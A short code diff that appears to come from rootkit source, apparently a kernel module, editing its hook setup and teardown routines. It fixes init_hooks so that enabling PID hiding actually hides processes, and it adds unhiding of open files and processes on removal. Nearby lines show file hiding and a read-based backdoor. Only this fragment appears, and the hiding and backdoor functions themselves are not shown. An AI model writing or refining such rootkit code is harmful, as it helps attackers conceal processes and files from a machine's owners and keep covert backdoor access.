@@ -72,10 +72,8 @@ init_hooks(void)
     if (rootkit.hiding_open)
         hide_open();
 
-    if (rootkit.hiding_pids) {
-        clear_hidden_pids();
-        unhide_pids();
-    }
+    if (rootkit.hiding_pids)
+        hide_pids();
 
     if (rootkit.backdoor == BD_READ)
         backdoor_read();
@@ -91,6 +89,14 @@ remove_hooks(void)
 
     if (rootkit.hiding_files)
         unhide_files();
+
+    if (rootkit.hiding_open)
+        unhide_open();
+
+    if (rootkit.hiding_pids) {
+        clear_hidden_pids();
+        unhide_pids();
+    }
 
     if (rootkit.backdoor != BD_OFF)
         unbackdoor();
